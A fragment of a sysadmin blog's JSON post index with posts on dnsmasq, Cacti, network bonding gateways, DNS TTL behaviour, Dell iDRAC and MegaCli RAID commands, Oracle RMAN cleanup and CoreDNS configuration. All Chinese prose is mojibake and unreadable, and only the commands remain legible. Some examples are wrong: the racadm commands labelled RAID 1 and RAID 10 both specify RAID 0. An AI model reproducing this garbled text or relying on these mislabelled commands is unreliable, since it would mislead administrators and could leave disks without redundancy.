","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-centos7_passwd/","series":null,"tags":null,"title":"åˆè§„è¦æ±‚ä¹‹CentOS7çš„ç”¨æˆ·å¯†ç ç­–ç•¥"},{"categories":null,"content":"ä¸€ï¼šä»‹ç»ï¼š DNSMasqä¸»è¦ç”¨æ¥è§£å†³å†…ç½‘DNSåŸŸåç¼“å­˜ã€DHCPã€ç½‘ç»œå¯åŠ¨å’Œè·¯ç”±é€šå‘ŠåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯å°†DNSMasqä½œä¸ºå†…ç½‘DNSåŸŸååŠ«æŒä½¿ç”¨\nç³»ç»Ÿç¯å¢ƒï¼šcentos7.6 éœ€æ±‚ï¼šä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip ä¸»æœºipï¼šï¼ˆå†…ç½‘ä¸»æœº172.18.30.1å’Œ172.18.30.2ï¼‰\näºŒï¼šé…ç½®æ–¹æ³• 1ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®åˆ°/etc/dnsmasq.conf addn-hosts=/etc/ty.ddky.local\naddn-hostsï¼šå¦‚æœè¦æ”¯æŒä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ª IPï¼Œå°±å¿…é¡»ç”¨ addn-hosts é€‰é¡¹\n2ï¼Œ/etc/ty.ddky.local æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 172.18.33.100 ty.ddky.local 172.18.33.104 ty.ddky.local\n3ï¼Œä¿®æ”¹å®Œæˆåé‡å¯ DNSMasq systemctl restart dnsmasq.service\n","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221219-dnsmqsq_multi_ip/","series":null,"tags":null,"title":"Dnsmasqé…ç½®ä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip"},{"categories":null,"content":"ç½‘ç»œå·¥ç¨‹å¸ˆé€‰æ‹©ç½‘ç»œè®¾å¤‡çš„ç›‘æ§å·¥å…·æ˜¯è€ç‰Œçš„cactiï¼Œå½“ç„¶ä½œä¸ºç³»ç»Ÿå·¥ç¨‹å¸ˆçš„æˆ‘ï¼Œè¿˜æ˜¯è§‰å¾—librenmsæ˜¯ä¸ªå¥½é€‰æ‹©ï¼Œä½†æ˜¯ï¼Œlibrenmsä¼šå¯¹ç½‘ç»œè®¾å¤‡cpué€ æˆæ¯”è¾ƒå¤§çš„å‹åŠ›ã€‚é‚£è¿˜æ˜¯éµä»ä»–çš„é€‰æ‹©ï¼Œæœ€è¿‘ç½‘å·¥æŠ¥å‘Šè¯´ï¼š\né€‰æ‹©å›¾å½¢çš„æ—¶å€™æ—¶é—´Filterå¤±æ•ˆäº†ã€‚é€‰æ‹©äº†ä»¥åå›¾å½¢æ— å˜åŒ–ï¼Œå´©æºƒï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œéƒ½ä¸Šå¤çš„ç©æ„äº†ã€‚\nä¿®æ”¹æ–¹æ³•ï¼š\nä¿®æ”¹graph_image.php\nunixtime = 1600000000ï¼Œä¹Ÿå°±æ˜¯åˆ° 2020-09-13 20:26:40ã€‚æ”¾å¤§åˆ° 2600000000ï¼Œä¹Ÿå°±æ˜¯åˆ°2052-05-22 22:13:20ï¼Œå†™è¿™ä¸ªphpç¨‹åºçš„äººé˜²è¶Šç•Œï¼Œå´æ²¡æƒ³åˆ°æ—¶é—´çœŸçš„æ¥åˆ°äº†è¿™ä¸ªèŠ‚ç‚¹ã€‚\næ³¨ï¼šUnix æ—¶é—´æˆ³æ˜¯ä»1970å¹´1æœˆ1æ—¥ï¼ˆUTC/GMTçš„åˆå¤œï¼‰å¼€å§‹æ‰€ç»è¿‡çš„ç§’æ•°ï¼Œä¸è€ƒè™‘é—°ç§’ã€‚\n","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-cacti_time_filter/","series":null,"tags":null,"title":"è€ç‰ˆæœ¬cactiçš„å›¾å½¢filterçªç„¶å¤±æ•ˆçš„è§£å†³åŠæ³•"},{"categories":null,"content":"çº¿ä¸ŠæœåŠ¡å™¨172.18.30.67 æœ‰4ä¸ªç½‘å£\nå…¶ä¸­eno1å’Œeno2æ˜¯ä¸¤ä¸ªå…‰çº¤ä¸‡å…†å£ï¼Œenp26s0f0å’Œenp26s0f1æ˜¯ä¸¤ä¸ªä»¥å¤ªåƒå…†ç½‘å£ã€‚\neno2ç½‘å¡åœ¨æ²¡åšbondingçš„æ—¶å€™ï¼Œé€šè¿‡NetworkManagerçš„dhcpè·å¾—äº†åœ°å€ã€‚ç„¶åeno1å’Œeno2åšäº†bondingï¼Œä½†æ˜¯eno2å®é™…è¿˜åœ¨å•ç‹¬èµ·ä½œç”¨ï¼Œbondingååœ°å€æ²¡å»æ‰ï¼Œå¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ã€‚è·¯ç”±è¡¨å¦‚ä¸‹ï¼š\n1[root@renhe-18-30-67 ~]# ip r 2default via 172.18.29.254 dev eno2 3default via 172.18.31.254 dev br0.199 proto static metric 426 4172.18.28.0/23 dev eno2 proto kernel scope link src 172.18.28.67 5172.18.30.0/23 dev br0.199 proto kernel scope link src 172.18.30.67 metric 426 6192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1 eno2æ˜¯ä»dhcpè·å¾—äº†172.18.28.67çš„åœ°å€\n1ip a 2eno2: flags=6211\u0026lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST\u0026gt; mtu 1500 3 inet 172.18.28.67 netmask 255.255.254.0 broadcast 172.18.29.255 4 ether b4:05:5d:08:e0:d8 txqueuelen 1000 (Ethernet) 5 RX packets 81768780 bytes 5398659503 (5.0 GiB) 6 RX errors 0 dropped 7 overruns 0 frame 0 7 TX packets 10044620 bytes 467566304 (445.9 MiB) 8 TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 è¿™ç§æƒ…å†µä¸‹ï¼Œå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š\nbondingçš„æ¨¡å¼æ˜¯ ç‰©ç†ç½‘å¡ \u0026ndash;\u0026gt; bond \u0026ndash;\u0026gt; bond.xxx \u0026ndash;\u0026gt;br.xxx\nå…ˆæŸ¥bondingæ¨¡å¼:\n1cat /sys/class/net/bond0/bonding/mode 2active-backup 1 å†çœ‹bondingç½‘å¡çŠ¶æ€ï¼š\n1cat /proc/net/bonding/bond0 2Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011) 3 4Bonding Mode: fault-tolerance (active-backup) 5Primary Slave: eno1 (primary_reselect always) 6Currently Active Slave: eno1 7MII Status: up 8MII Polling Interval (ms): 100 9Up Delay (ms): 0 10Down Delay (ms): 0 11 12Slave Interface: eno1 13MII Status: up 14Speed: 10000 Mbps 15Duplex: full 16Link Failure Count: 1 17Permanent HW addr: b4:05:5d:08:e0:d8 18Slave queue ID: 0 19 20Slave Interface: eno2 21MII Status: up 22Speed: 10000 Mbps 23Duplex: full 24Link Failure Count: 1 25Permanent HW addr: b4:05:5d:08:e0:d9 26Slave queue ID: 0 å†æ¬¡ç¡®è®¤active\n1cat /sys/class/net/bond0/bonding/active_slave 2eno1 å†ç¡®è®¤ç¬¬äºŒä¸ªdefaultç½‘å…³æœ‰æ•ˆ\n1ping -I br0.199 172.18.31.254 ä»ä»¥ä¸Šå¯ä»¥ç¡®å®šä¸»ç½‘å¡æ˜¯eno1ï¼Œshutdownäº†eno2ä¸ä¼šå½±å“ä»»ä½•ä¸œè¥¿ã€‚\næ¥ä¸‹æ¥çš„æ­¥éª¤ï¼š\nå…ˆæŸ¥å‡ºæ¥dhclientçš„è¿›ç¨‹å·ï¼Œæ˜¯2252\n1 1 2252 2252 2252 ? -1 Ss 0 8:50 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eno2.lease -pf /var/run/dhclient-eno2.pid -H renhe-18-30-67 eno2 ç„¶åå¤„ç†ï¼š\n1systemctl stop NetworkManager 2systemctl disable NetworkManager 3# æ€æ‰dhclient 4kill -9 2252 è¿™æ ·eno2çš„ipåœ°å€åœ¨è¿‡ä¸€æ®µæ—¶é—´åä¼šæ¶ˆå¤±æ‰ã€‚\nå¦‚æœä¸æ¶ˆå¤±ï¼š\n1ip link set eno2 down ç„¶åç­‰ç­‰\n1ip link set eno2 up å°±å¯ä»¥äº†ã€‚\nç”±äºæ˜¯çº¿ä¸ŠæœåŠ¡å™¨ï¼Œæ— æ³•åœæœºï¼Œæ‰€ä»¥æ“ä½œæ‰æå¾—è¿™ä¹ˆå°å¿ƒè°¨æ…ã€‚\n","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-multi_gateway/","series":null,"tags":null,"title":"çº¿ä¸ŠæœåŠ¡å™¨å‡ºç°å¤šç½‘å…³é—®é¢˜çš„å¤„ç†"},{"categories":null,"content":"114.114.114.114 è¿™ä¸ªDNSä¿®æ”¹è®°å½•ç­‰å¾…çš„ç”Ÿæ•ˆæ—¶é—´éå¸¸çš„é•¿ï¼Œè¿œè¿œè¶…å‡ºäº†TTLçš„æ—¶é•¿ï¼ŒåŸºæœ¬æ˜¯ä½ è®¾ç½®TTLæ—¶é—´çš„6å€ã€‚\nè¿™æ˜¯ä¸Šæ¬¡æˆ‘ä»¬å‰²æ¥å¾—åˆ°çš„æ•™è®­å•Šã€‚æˆ‘ä»¬è¦å‰²æ¥m.ddky.comçš„åŸŸåã€‚\næ³¨ï¼šåœ¨ä¿®æ”¹m.ddky.comçš„è®°å½•å‰ï¼Œå·²ç»æŠŠddky.comçš„m.ddky.comçš„TTLæ”¹æˆäº†1åˆ†é’Ÿï¼Œæ­£å¸¸çš„æ¥è¯´ï¼Œç¬¬ä¸€è½®1åˆ†é’Ÿå†…ä¸æ›´æ–°ï¼Œç¬¬äºŒè½®2åˆ†é’Ÿå†…ä¹Ÿåº”è¯¥æ›´æ–°äº†ã€‚\nçœ‹ä¸‹å›¾ï¼Œåœ¨å¸¦å¤–æœºä¸Šåšçš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ—¶å€™8.8.8.8å’Œ223.5.5.5éƒ½å·²ç»ç”Ÿæ•ˆäº†ï¼Œå˜æˆäº†å¸è”çš„åœ°å€ã€‚\n06:06:57 åšäº†æŸ¥è¯¢ï¼Œå»æ‰å°æ—¶ï¼Œ06ï¼š57å®šä¹‰ä¸ºèµ·å§‹æ—¶é—´ã€‚ ä¸€ç›´åˆ° 12:22 åˆ†è¿˜æ²¡æœ‰å˜è¿‡æ¥ï¼Œå¤§æ¦‚ 13:00 å˜è¿‡æ¥\nèµ·å§‹ 06:57 \u0026ndash; 13:00 ï¼Œä¸€å…±ç”¨äº†6åˆ†é’Ÿã€‚è€ŒTTLæ˜¯1åˆ†é’Ÿï¼Œæ‰€ä»¥åŸºæœ¬æ˜¯6å€æ—¶é—´ã€‚\nå¾€å‰æ¨æµ‹5æœˆ25æ—¥çš„DNSå‰²æ¥ï¼ŒTTLæ˜¯10åˆ†é’Ÿï¼Œ6å€ï¼Œå°±æ˜¯60åˆ†é’Ÿï¼ŒåŸºæœ¬å»åˆã€‚\nå¦‚æœæƒ³è®©DNSå°½å¿«ç”Ÿæ•ˆï¼ŒTTLæ”¹æˆ10ç§’æ˜¯æé™äº†ã€‚ ","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-dns_114/","series":null,"tags":null,"title":"114dnsçš„ttlè¶…æ—¶çš„æ•™è®­"},{"categories":null,"content":"é¦–å…ˆsshåˆ°idracå»ï¼Œç›´æ¥ä¼šè¿›å…¥racadmçš„ç•Œé¢\næˆ‘ä»¬ä»¥2022å¹´æœ€æ–°çš„dellæœºå™¨ä¸ºä¾‹ï¼Œè€çš„æœºå™¨æ˜¾ç¤ºçš„ä¸œè¥¿ä¸ä¸€è‡´\n1ssh 10.18.30.104 2Password: 3racadm\u0026gt;\u0026gt; æ³¨æ„ï¼Œshellå‘½ä»¤æœ‰è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼ŒæŒ‰ä¸¤ä¸‹tabé”®ä¼šè‡ªåŠ¨è¡¥\nåšraidçš„å…¨éƒ¨å‘½ä»¤éƒ½åœ¨storageçš„å­å‘½ä»¤ä¸‹\nä¸€ã€é¦–å…ˆæ‹¿åˆ°raidå¡çš„åç§°ï¼š\n1racadm\u0026gt;\u0026gt;storage get controllers 2RAID.Slot.1-1 3AHCI.Embedded.2-1 4AHCI.Embedded.1-1 RAID.Slot.1-1 æ˜¯Raidå¡æ§åˆ¶å™¨åç§°ï¼Œä¸‹é¢ä¸¤ä¸ªæ˜¯ä¸»æ¿å†…ç½®çš„ï¼Œå¿½ç•¥ã€‚\näºŒã€ç„¶åæ‹¿åˆ°æ‰€æœ‰ç‰©ç†ç›˜çš„åç§°ï¼š\n1racadm\u0026gt;\u0026gt;storage get pdisks 2Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1 3Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1 4Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1 5Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1 ä¸‰ã€çœ‹çœ‹æœ‰æ²¡æœ‰å·²ç»åšå¥½çš„è™šæ‹Ÿç£ç›˜\n1racadm\u0026gt;\u0026gt;storage get vdisks æ˜¾ç¤ºä¸ºç©ºï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒå¤§èƒ†çš„å»åšäº†\nå››ã€åˆ’åˆ†RAID æ ¹æ®çº§åˆ«ä¸åŒï¼Œç²¾ç®€è¿‡çš„åä»¤å¦‚ä¸‹ï¼š\n1racadm storage createvd:\u0026lt;æ§åˆ¶å™¨\u0026gt; -rl {r0|r1|r5|r6|r10|r50|r60} -pdkey:\u0026lt;ç£ç›˜ç»„ï¼Œç”¨é€—å·åˆ†å‰²\u0026gt; 2 3-rl â€” Sets the storage level. 4 r0 â€” storage 0-Striping 5 r1 â€” storage 1-Mirroring 6 r5 â€” storage 5-Striping with Parity 7 r6 â€” storage 6-Striping with Extra Parity 8 r10 â€” storage 10-Spanned Striping with Mirroring 9 r50 â€” storage 50-Spanned Striping with Parity 10 r60 â€” storage 60-Spanned Striping with Extra Parity ç»™å‡ºä¾‹å­ï¼š\n1#raid0 2racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1 3 4#raid1 5racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1 6 7#raid10 8racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1 äº”ã€å»ºç«‹job é¦–å…ˆå°è¯•ä¸é‡å¯åœ¨çº¿å»ºRaidï¼š\n1racadm\u0026gt;\u0026gt;jobqueue create RAID.Slot.1-1 --realtime å¦‚æœä¸è¡Œï¼Œå°±å»ºç«‹é‡å¯çš„\n1racadm\u0026gt;\u0026gt;jobqueue create RAID.Slot.1-1 2racadm jobqueue create RAID.Slot.1-1 3RAC1024: Successfully scheduled a job. 4Verify the job status using \u0026#34;racadm jobqueue view -i JID_xxxxx\u0026#34; command. 5Commit JID = JID_222873363294 å…­ã€å¦‚æœè¦é‡å¯ï¼Œå°±é‡å¯ã€‚èƒ½åœ¨çº¿å»ºçš„å°±ä¸éœ€è¦é‡å¯\n1racadm\u0026gt;\u0026gt;serveraction powercycle 2racadm serveraction powercycle 3Server power operation successful è¡¥å……ï¼š\nå¦‚æœè¦æ¸…ç†æ‰Raidå¡ä¹‹å‰çš„é…ç½®å®Œå…¨é‡å»ºï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\n1storage resetconfig:RAID.Slot.1-1 2jobqueue create RAID.Slot.1-1 -r pwrcycle -s TIME_NOW -e TIME_NA ","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221219-dell_ssh_raid/","series":null,"tags":null,"title":"DellæœåŠ¡å™¨ç”¨sshæ–¹å¼åˆ’åˆ†ç£ç›˜Raidçš„æ–¹æ³•"},{"categories":null,"content":"è¿™Megacliæ˜¯æ“ä½œç£ç›˜Raidçš„å¸¸ç”¨è½¯ä»¶ï¼Œæ—¥å¸¸ç”¨çš„å¤§å¤šæ˜¯dellå®¶çš„æœºå™¨ï¼Œéƒ½æ˜¯è¿™è½¯ä»¶ï¼Œè®°å½•ä¸€ä¸‹ã€‚\n1#!/bin/sh 2#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 3/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 | grep -A1 \u0026#34;Enclosure Device\u0026#34; 4 5# clear foreign disk 6#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -scan -a0 7#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -clear -a0 8 9# clear Firmware state 10#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39; 11#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv \u0026#34;[32:3]\u0026#34; -a0 12 13# clear Firmware JBOD mode, first turn into unconfig mode, then MakeGood 14#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39; 15#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv [32:3] -force -a0 16 17#/opt/MegaRAID/MegaCli/MegaCli64 AdpGetProp EnableJBOD -aALL 18#/opt/MegaRAID/MegaCli/MegaCli64 -AdpSetProp -EnableJBOD -1 -a0 19#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeJBOD -PhysDrv[252:0] -a0 20 21# create Raid0 22#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r0[252:3] -a0 23# Get old Cache, ex: Virtual Drive(Target ID 02) 24#/opt/MegaRAID/MegaCli/MegaCli64 -GetPreservedCacheList -a0 25# Clear cache, ex: Virtual Drive(Target ID 02) 26#/opt/MegaRAID/MegaCli/MegaCli64 -DiscardPreservedCache -L2 -a0 27# create Raid1 28#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r1[252:4,252:5] -a0 29# create Raid5 30#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r5[252:2,252:3,252:4,252:5] -a0 31# create Raid10 32#/opt/MegaRAID/MegaCli/MegaCli64 -CfgSpanAdd -r10 -Array0[32:4,32:5] -Array1[32:6,32:7] -a0 33 34#delete raid 35#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdDel -L0 -a0 36#Virtual Drive: 0 (Target Id: 0) 1# check Raid 2#/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL 3#RAID 1 4#RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0 5#RAID 5 6#RAID Level : Primary-5, Secondary-0, RAID Level Qualifier-3 7 8# check Raid disks 9#/opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aAll | egrep \u0026#34;^Adapter|^Number of Virtual|^Virtual Drive:|^Name|^Enclosure Device ID:|^Slot Number:\u0026#34; 10 11# GPT part 12#parted -s /dev/sde mklabel gpt mkpart primary 0% 100% 13 14# check disk rebuild progress 15#/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -physdrv[32:1] -aALL 16#Rebuild Progress on Device at Enclosure 32, Slot 1 Completed 7% in 3 Minutes. 17 18# Force rebuild 19#/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -physdrv[32:1] -a0 20# OR 21#/opt/MegaRAID/MegaCli/MegaCli64 -pdlocate -start -physdrv[32:1] -a0 22 23#Start rebuild, first clean the foreign configuration and then make the device hot spare (only if the above command failed) 24#/opt/MegaRAID/MegaCli/MegaCli64 -CfgForeign -Clear -aALL 25#set global hostspare 26#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Set -PhysDrv [32:1] -a0 27 28#If you need to unset/remove a global hotspare: 29#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Rmv -PhysDrv [32:1] -aN 30 31#downgrade raid6 --\u0026gt; raid5 ,and more space now can be used 32# -L0 virtual disk 0 33# /opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -L0 -a0 34# echo 1 \u0026gt; /sys/block/sda/device/rescan 35 36#Add disk to a raid5 37#/opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -Add -PhysDrv[32:3] -L0 -a 38 39#Configure WriteThrough or WriteBack 40#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WT -Immediate -Lall -aAll 41#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WB -Immediate -Lall -aAll 42 43#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL |grep \u0026#34;Inquiry Data:\u0026#34; 44#Inquiry Data: SEAGATE ST600MP0005 VS08S7M04B0C 45#Inquiry Data: SEAGATE ST600MP0005 VS08S7M04AFD 46#Inquiry Data: SEAGATE ST600MP0005 VS08S7M04JAY 47#Inquiry Data: SEAGATE ST600MP0005 VS08S7M04AAG 48 49#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL | grep \u0026#34;Drive Temperature\u0026#34; 50#Drive Temperature :36C (96.80 F) 51#Drive Temperature :35C (95.00 F) ","date":"2022-12-17","img":"","permalink":"https://rendoumi.com/posts/20221217-megacli/","series":null,"tags":null,"title":"Megacliæ“ä½œç£ç›˜çš„å¸¸ç”¨å‘½ä»¤"},{"categories":null,"content":"è¿™ä¸€ç¯‡æ­£è§„çš„DBAçœ‹åˆ°è‚¯å®šä¼šå‘²ä¹‹ä»¥é¼»ï¼Œä½†å¯¹äºæ²¡æœ‰ç”¨è¿‡oracleçš„ç³»ç»Ÿè¿ç»´æ¥è¯´ï¼Œå°±æ˜¯å¿…é¡»çŸ¥é“çš„äº‹æƒ…äº†ã€‚\nå…¬å¸çš„ Oracle å®ä¾‹æœ‰ä¸¤å°æ•°æ®åº“ï¼Œå®šæ—¶ç”¨rmanå¤‡ä»½ï¼Œä½†æ˜¯æ²¡æœ‰è‡ªåŠ¨æ¸…ç†æœºåˆ¶ ï¼Œè¿‡ä¸€é˜µå­ç£ç›˜å°±ä¼šè¶…è¿‡ 80% å‘Šè­¦ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œçƒ¦ä¸èƒœçƒ¦ã€‚\nå‡¡æ˜¯è¦æ‰‹åŠ¨åšä¸‰æ¬¡çš„äº‹æƒ…å¿…é¡»è‡ªåŠ¨åŒ–å¤„ç†ï¼Œå¯è£å¤§å¸ˆå¦‚æ˜¯è¯´ï¼Œç…§åŠå°±æ˜¯ã€‚\n1cat del_log.sh 2 3#!/bin/bash 4 5source /home/oracle/.bash_profile 6 7rman target / \u0026lt;\u0026lt; EOF 8delete noprompt archivelog until time \u0026#39;sysdate-7\u0026#39;; 9exit; 10EOF å¾ˆç®€å•å§ã€‚ä¸Šé¢å¼•ç”¨çš„ .bash_profile å†…å®¹å¦‚ä¸‹ï¼š\n1# .bash_profile 2 3# Get the aliases and functions 4if [ -f ~/.bashrc ]; then 5 . ~/.bashrc 6fi 7 8# User specific environment and startup programs 9 10PATH=$PATH:$HOME/.local/bin:$HOME/bin 11export PATH 12export ORACLE_BASE=/data/u01/app/oracle 13export ORACLE_HOME=/data/u01/app/oracle/product/18.3.0/dbhome_1 14export ORACLE_SID=oradb 15export PATH=/usr/sbin:$PATH 16export PATH=$ORACLE_HOME/bin:$PATH:/usr/local/bin 17export LD_LIBRARY_PATH=$ORACLE_HOME/lib:/lib:/usr/lib:$ORACLE_HOME/rdbms/lib 18export CLASSPATH=$ORACLE_HOME/JRE:$ORACLE_HOME/jlib:$ORACLE_HOME/rdbms/jlib 19export NLS_DATE_FORMAT=\u0026#39;yyyy/mm/dd hh24:mi:ss\u0026#39; 20export EDITOR=vi 21umask 022 è¿™ä¸ª del_log.sh çš„è„šæœ¬æ”¾è¿› oracle ç”¨æˆ·çš„ crontab é‡Œæ‰§è¡Œå°±å¥½\n10 3 * * * /usr/local/bin/del_log.sh ","date":"2022-12-08","img":"","permalink":"https://rendoumi.com/posts/20221208-oracle_rman/","series":null,"tags":null,"title":"Oracleä½¿ç”¨rmanå®šæ—¶æ¸…é™¤7å¤©å‰çš„æ—¥å¿—"},{"categories":null,"content":"CoreDNSæ˜¯k8sçš„å¾¡ç”¨DNSè§£æè½¯ä»¶\næ”¯æŒå¾ˆå¤šæ’ä»¶ï¼Œå„ç§DoHã€DoTã€gRPC ï¼Œå„ç§ç‰¹æ€§ï¼Œå®‰è£…é…ç½®ä¹Ÿååˆ†ç®€å•\næ›¿ä»£dnsmasqåï¼ŒåŸºæœ¬dnsmasqçš„åŠŸèƒ½éƒ½æ”¯æŒï¼Œä¿®æ”¹åŠ«æŒåŸŸååä¹Ÿä¸ç”¨é‡å¯ï¼Œä¼šè‡ªåŠ¨åˆ·æ–‡ä»¶æ›´æ–°\nä¸‹é¢è¯´ä¸€ä¸‹è£…æ³•ï¼š\nå®‰è£…ï¼š\nwget https://github.com/coredns/coredns/releases/download/v1.7.0/coredns_1.7.0_linux_amd64.tgz\rè§£å‹åå°±ä¸€ä¸ªæ–‡ä»¶ï¼Œç›´æ¥æ”¾åˆ°/usr/local/bin\nåšä¸ªsystemdå¯åŠ¨æ–‡ä»¶\n1cat /etc/systemd/system/coredns.service 2[Unit] 3Description=CoreDNS DNS server 4After=network.target 5 6[Service] 7PermissionsStartOnly=true 8LimitNOFILE=1048576 9LimitNPROC=512 10CapabilityBoundingSet=CAP_NET_BIND_SERVICE 11AmbientCapabilities=CAP_NET_BIND_SERVICE 12NoNewPrivileges=true 13ExecStart=/usr/local/bin/coredns -conf=/usr/local/bin/coredns.conf 14ExecReload=/bin/kill -SIGUSR1 $MAINPID 15Restart=on-failure 16 17[Install] 18WantedBy=multi-user.target ä¸œè¥¿å…¨éƒ½åœ¨/usr/local/bin/coredns.confé…ç½®æ–‡ä»¶é‡Œï¼š\n1.:5353 https://.:443 { 2 any 3 log 4 debug 5 bind 172.18.30.1 6 tls /usr/local/bin/full.pem /usr/local/bin/key.pem 7 hosts /etc/hosts { 8 ttl 60 9 reload 1m 10 no_reverse 11 fallthrough 12 } 13 cache 120 14 reload 6s 15 loadbalance 16 forward . 114.114.114.114:53 223.5.5.5:53 223.6.6.6:53 { 17 policy sequential 18 } 19 prometheus 172.18.30.1:9253 20 21} è§£é‡Šä¸€ä¸‹ï¼š\n1. è¡¨ç¤ºæ‰€æœ‰åŸŸåï¼Œ.:5353 å’Œ https://.:443 è¡¨ç¤ºå¼€äº†5353å’Œ443ç«¯å£æ¥æœåŠ¡æ‰€æœ‰åŸŸåçš„æŸ¥è¯¢ 2bind 172.18.30.1 ç»‘å®šæŒ‡å®šip 3tls full.pemå’Œkey.pemæ˜¯legoç”Ÿæˆçš„*.rendoumi.comçš„è¯ä¹¦é“¾å’Œç§é’¥ 4hosts è¡¨ç¤ºä»æ–‡ä»¶è§£æï¼Œreload 1mä¼šè‡ªåŠ¨æ‰«ææ–‡ä»¶å˜åŠ¨å¹¶åŠ è½½ 5 æœ€æœ‰ç”¨çš„æ˜¯fallthrough ï¼Œå¦‚æœåœ¨/etc/hosts æ‰¾ä¸åˆ°è®°å½•ï¼Œé‚£å°±ç»§ç»­ï¼Œå»ä¸‹é¢çš„é…ç½®é‡Œæ‰¾ 6loadbalance è¡¨ç¤ºå¦‚æœæŸ¥åˆ°çš„è®°å½•æœ‰å¤šæ¡ï¼Œé‚£å°±æŒ‰round-robinè½®è¯¢è¿”å›ç»“æœ 7forward è¿™é‡ŒæŒ‡å®šä¸Šæ¸¸æœåŠ¡å™¨ï¼Œæœ€å¤šå¯ä»¥æœ‰15ä¸ªä¸Šæ¸¸ 8 policyæ˜¯ä¸¥æ ¼æŒ‰é¡ºåºæ¥ï¼Œé¦–å…ˆ114ï¼Œ114åäº†5.5.5ï¼Œ5.5.5åäº†6.6.6ï¼Œå¦‚æœä¸æŒ‡å®šä¼šä»upstreamé‡Œéšæœº 9\tæŒ‘ä¸€ä¸ª 10prometheus éœ²å‡ºç«¯å£ï¼Œä¾›prometheusåˆ®æ•°æ®ç”¨ ç„¶åå¯åŠ¨ï¼Œå°±å¯ä»¥äº†ï¼Œè¿™é‡Œä¸ºäº†é¿å…è·Ÿdnsmasqå†²çªï¼Œç”¨äº†5353ï¼Œå®é™…åº”è¯¥æ˜¯53ç«¯å£\nsystemctl start coredns\ræµ‹ä¸€ä¸‹æ ‡å‡†çš„dnsæŸ¥è¯¢\ndig -t a m.ddky.com @172.18.30.1 -p5353\rä¸‹é¢æ¥è§£é‡ŠDoHï¼ŒDNS-Over-HTTPSï¼Œè¿™ä¸ªç‰¹æ€§éå¸¸é¬¼ç•œ æ³¨æ„ï¼Œå‡†ç¡®çš„è¯´httpsæäº¤çš„æ˜¯dns-message\nå…ˆæµ‹ä¸€ä¸‹CF\ncurl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=m.ddky.com\u0026amp;type=A' | jq 